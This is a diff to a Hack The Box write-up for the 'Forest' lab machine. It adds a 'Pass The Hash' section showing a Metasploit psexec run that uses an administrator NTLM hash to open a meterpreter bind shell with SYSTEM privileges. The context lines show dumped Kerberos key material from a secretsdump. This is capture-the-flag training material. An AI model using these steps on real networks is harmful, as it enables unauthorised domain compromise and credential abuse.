@@ -467,8 +467,71 @@ EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
 EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 ```
+##Pass The Hash
+```console
+msf5 exploit(windows/smb/psexec) > options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting                                                    Required  Description
+   ----                  ---------------                                                    --------  -----------
+   RHOSTS                10.10.10.161                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                 445                                                                yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                     no        The service display name
+   SERVICE_NAME                                                                             no        The service name
+   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             htb.local                                                          no        The Windows domain to use for authentication
+   SMBPass               aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6  no        The password for the specified username
+   SMBUser               administrator                                                      no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LPORT     4444             yes       The listen port
+   RHOST     10.10.10.161     no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+msf5 exploit(windows/smb/psexec) > run
+
+[*] 10.10.10.161:445 - Connecting to the server...
+[*] 10.10.10.161:445 - Authenticating to 10.10.10.161:445|htb.local as user 'administrator'...
+[*] 10.10.10.161:445 - Selecting PowerShell target
+[*] 10.10.10.161:445 - Executing the payload...
+[+] 10.10.10.161:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Started bind TCP handler against 10.10.10.161:4444
+[*] Sending stage (180291 bytes) to 10.10.10.161
+[*] Meterpreter session 2 opened (10.10.16.9:40655 -> 10.10.10.161:4444) at 2020-01-23 15:52:28 +0200
+
+meterpreter > shell
+Process 3576 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostname  
+hostname
+FOREST
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
 ## Resources:
 [https://securityonline.info/aclpwn/](https://securityonline.info/aclpwn/)
+
 
 
 [![alt text](https://www.hackthebox.eu/badge/image/131282)](https://www.hackthebox.eu/profile/131282 "Zer0Code")
